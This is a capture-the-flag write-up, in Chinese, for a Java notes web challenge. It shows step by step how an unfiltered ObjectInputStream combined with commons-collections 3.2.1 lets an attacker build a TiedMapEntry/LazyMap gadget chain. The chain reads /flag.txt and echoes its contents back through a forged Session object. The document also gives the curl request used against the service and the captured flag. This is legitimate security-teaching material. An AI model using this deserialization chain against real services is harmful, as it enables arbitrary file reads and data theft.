# java notes — WRITEUP

**Flag: `K17{i_am_java_ONE_with_java!!!!oashd8aghrdfo8aehFIOEASDJFNLC}`**

## 题面

> I heard Java's the hot new language on the block. It's certainly making my CPU hot!

一个笔记站：`/api/save` 把你的笔记序列化成 **Java 序列化**的 token（base64），
`/api/restore` 把 token 反序列化回来。flag 在容器里 `/flag.txt`（644，谁都能读）。

## 漏洞

`Main.RestoreHandler`：

```java
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(raw))) {
    Object obj = ois.readObject();          // ← 没有任何 ObjectInputFilter
```

而 `pom.xml` 里躺着一个祖传依赖：

```xml
<dependency>
  <groupId>commons-collections</groupId>
  <artifactId>commons-collections</artifactId>
  <version>3.2.1</version>               <!-- CC1/CC5/CC6 gadget 全家桶 -->
</dependency>
```

shade 插件把它打进 fat jar，JDK 11 + commons-collections 3.2.1 = 教科书级的 RCE。

## 但这是个「有回显」的反序列化

普通的 ysoserial 是盲打（`Runtime.exec` 的输出回不来）。这里响应只会把 **Session 对象本身**吐回来：

```java
if (obj instanceof Session) send(ex, 200, ..., sessionJson((Session) obj));   // 否则 400
```

所以如果 root 对象是 gadget（HashSet 之类），只会得到 `that token is not a session`，
什么都读不到。**必须让 flag 自己跑进被回显的那个对象图里。**

看 `sessionJson` / `jsonEscape`：

```java
b.append('"').append(jsonEscape(String.valueOf(s.notes.get(i)))).append('"');
```

`Session.notes` 声明成 `List<String>`，但**泛型擦除 + 反序列化不检查元素类型**，
所以我们可以往里面塞任意对象，它的 **`toString()` 会在服务端被调用**。

于是挑 `TiedMapEntry`：

```java
public String toString() { return getKey() + "=" + getValue(); }   // getValue() -> map.get(key)
```

`getValue()` 打到 `LazyMap.get()` → `ChainedTransformer.transform()`。链子本身不碰反射，
只用**本身就可序列化的常量**（Class / File / String），运行时的 `RandomAccessFile` 是现造的：

```java
Transformer[] transformers = {
    new ConstantTransformer(RandomAccessFile.class),
    new InstantiateTransformer(new Class[]{File.class, String.class},
                               new Object[]{new File("/flag.txt"), "r"}),   // args 都是可序列化的
    new InvokerTransformer("readLine", new Class[]{}, new Object[]{}),
};
Map lazyMap = LazyMap.decorate(new HashMap(), new ChainedTransformer(transformers));
TiedMapEntry entry = new TiedMapEntry(lazyMap, "leak");
```

外层照抄题目自己的 Session（**类名必须是 `com.k17.javanotes.Main$Session`、
`serialVersionUID = 1L`**，字段名/类型一致，反序列化才认），把 `entry` 塞进 notes：

```java
List<String> notes = new ArrayList<>();
notes.add("totally a normal note");
((List) notes).add(entry);        // 泛型擦除，随便塞
serialize(new Session("leaky", "dark", notes))  →  base64
```

（注意：`ArrayList.readObject` 只做 add，不会碰到 `hashCode`/`toString`，
所以链条在**反序列化时不会提前触发**，只在我们被回显时才跑。）

## 利用

```
$ java -cp out:commons-collections-3.2.1.jar com.k17.javanotes.Main /flag.txt > token.b64
$ curl -s -X POST --data-binary @token.b64 https://<inst>/api/restore
{"username":"leaky","theme":"dark","notes":["totally a normal note",
  "leak=K17{i_am_java_ONE_with_java!!!!oashd8aghrdfo8aehFIOEASDJFNLC}"]}
```

本地先干跑验证过：`Verify.java` 用自己的 `/tmp/flag.txt` 反序列化，能拿到
`leak=K17{LOCAL_DRY_RUN_OK}`，再换成 `/flag.txt` 打远程。

## 环境备注

本机装了 `openjdk-11`（`sudo apt-get install -y openjdk-11-jdk-headless`，
和题目容器的 temurin-11 对齐），jar 从 Maven Central 拉的
（`repo1.maven.org` 通，`github.com` 不通）：
`https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar`。
生成器源码在同目录 `exploit/src/com/k17/javanotes/`。
